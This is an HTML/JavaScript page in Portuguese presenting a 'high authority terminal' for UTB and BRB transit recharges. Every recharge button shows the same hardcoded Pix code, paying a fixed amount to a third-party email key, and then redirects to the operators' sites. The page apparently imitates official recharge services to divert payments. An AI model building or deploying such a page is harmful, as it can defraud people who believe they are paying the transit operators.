<!DOCTYPE html>
<html lang="pt-br" theme="pf" translate="no">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>IAMOBI V5.1 | Terminal de Alta Autoridade</title>
    
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Sora:wght@600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://maxst.icons8.com/vue-static/landings/line-awesome/line-awesome/1.3.0/css/line-awesome.min.css">
    
    <style>
        :root { --inter-orange: #ff7a00; --inter-black: #050505; --inter-gray: #111111; }
        body { background: var(--inter-black); color: #fff; font-family: 'Inter', sans-serif; margin: 0; padding: 15px; }
        .container { width: 100%; max-width: 420px; }
        
        .header { text-align: center; padding: 20px; border: 1px solid var(--inter-orange); border-radius: 15px; margin-bottom: 20px; background: rgba(255,122,0,0.05); }
        .header h1 { font-family: 'Sora', sans-serif; color: var(--inter-orange); margin: 0; font-size: 1.6rem; }

        .card { background: var(--inter-gray); border-radius: 20px; padding: 20px; margin-bottom: 12px; border: 1px solid #222; }
        .utb { border-left: 5px solid var(--inter-orange); }
        .brb { border-left: 5px solid #3b82f6; }
        
        .btn { padding: 15px; border-radius: 10px; border: none; font-weight: 700; width: 100%; font-family: 'Sora', sans-serif; text-transform: uppercase; transition: 0.2s; margin-top: 10px; }
        .btn-orange { background: var(--inter-orange); color: #fff; }
        .btn-bank { background: #1a1a1a; color: #fff; font-size: 0.75rem; border: 1px solid #333; }
        
        /* Modal Style Estilo Taggo */
        #pixModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 9999; align-items: center; justify-content: center; overflow-y: auto; }
        .modal-content { background: #fff; color: #000; padding: 25px; border-radius: 25px; width: 90%; max-width: 360px; text-align: center; }
        .qr-placeholder { background: #fff; padding: 15px; border-radius: 15px; margin: 15px auto; width: 210px; height: 210px; border: 1px solid #eee; }
        .pix-code-box { background: #f4f4f4; padding: 10px; border-radius: 8px; font-size: 10px; word-break: break-all; margin: 10px 0; border: 1px dashed #ccc; }
    </style>
</head>
<body>

<div id="pixModal">
    <div class="modal-content">
        <h2 id="modalTitle" style="font-family: 'Sora'; font-size: 1.2rem; color: #000;">PAGAMENTO PIX</h2>
        <div id="qrcode" class="qr-placeholder"></div>
        <div id="pixCodeDisplay" class="pix-code-box"></div>
        
        <button class="btn btn-orange" onclick="copiarPix()"> <i class="las la-copy"></i> COPIAR COPIA E COLA</button>
        <button class="btn" style="background:#000; color:#fff;" id="btnDirecionar">ABRIR SITE DE RECARGA</button>
        <button class="btn" style="background:transparent; color:#888;" onclick="fecharModal()">FECHAR</button>
    </div>
</div>

<div class="container">
    <div class="header">
        <h1>IAMOBI V5.1</h1>
        <small style="letter-spacing: 2px;">AUTORIDADE INTEGRADA</small>
    </div>

    <div class="card utb">
        <h2 style="font-size: 0.9rem; font-weight: 600;">UTB - SERVIÇOS</h2>
        <button class="btn btn-orange" onclick="gerarPagamento('utb', '03620000035530', 'pago@droppfy.com')">RECARGA VIA QR CODE</button>
    </div>

    <div class="card brb">
        <h2 style="font-size: 0.9rem; font-weight: 600;">BRB - MOBILIDADE</h2>
        <button class="btn" style="background:#3b82f6; color:#fff" onclick="gerarPagamento('brb', '1023449012', 'pago@droppfy.com')">TERMINAL QR BRB</button>
    </div>

    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px;">
        <button class="btn btn-bank" onclick="openBank('inter')">INTER</button>
        <button class="btn btn-bank" onclick="openBank('nubank')">NUBANK</button>
        <button class="btn btn-bank" onclick="openBank('itau')">ITAÚ</button>
        <button class="btn btn-bank" onclick="openBank('santander')">SANTANDER</button>
    </div>
    
    <footer style="text-align:center; font-size: 10px; color: #444; margin-top: 30px;">
        ESTE TERMINAL OPERA SOB PROTOCOLO DE ALTA AUTORIDADE
    </footer>
</div>

<script src="https://cdn.jsdelivr.net/npm/qrjs2@0.1.7/qrjs2.min.js"></script>
<script>
    let currentPixCode = "";
    let redirectUrl = "";

    // String base do Pix (ajustada para os dados que você enviou do Taggo)
    const PIX_BASE = "00020126380014BR.GOV.BCB.PIX0116pago@droppfy.com52040000530398654044.005802BR5907Partner6012Aguas Lindas62070503***6304B414";

    function gerarPagamento(tipo, id, email) {
        currentPixCode = PIX_BASE; // Aqui você pode tornar dinâmico conforme o valor futuramente
        redirectUrl = tipo === 'utb' ? "https://www.utb.com.br/recarga" : "https://onelink.to/mobilidade";
        
        // Limpar QR anterior
        document.getElementById('qrcode').innerHTML = "";
        
        // Gerar SVG do QR Code (Lógica Taggo)
        var qr = QRCode.generateSVG(currentPixCode, {
            ecclevel: "Q", fillcolor: "#FFF", textcolor: "#000", margin: 2, modulesize: 8
        });
        document.getElementById('qrcode').appendChild(qr);
        document.getElementById('pixCodeDisplay').innerText = currentPixCode;
        
        // Configurar Botão de redirecionamento
        const btnRedir = document.getElementById('btnDirecionar');
        btnRedir.onclick = function() {
            navigator.clipboard.writeText(id); // Copia o ID (UTB ou BRB) antes de ir pro site
            window.location.href = redirectUrl;
        };

        document.getElementById('pixModal').style.display = 'flex';
    }

    function copiarPix() {
        navigator.clipboard.writeText(currentPixCode).then(() => {
            alert("Código Pix Copia e Cola copiado!\nAbra o app do seu banco.");
        });
    }

    function fecharModal() {
        document.getElementById('pixModal').style.display = 'none';
    }

    function openBank(banco) {
        const links = {
            'inter': 'intent://#Intent;scheme=inter;package=br.com.intermedium;end',
            'nubank': 'intent://#Intent;scheme=nubank;package=com.nu.production;end',
            'itau': 'intent://#Intent;scheme=itau;package=com.itau;end',
            'santander': 'intent://#Intent;scheme=santander;package=br.com.santander.way;end'
        };
        window.location.href = links[banco];
    }
</script>
</body>
</html>
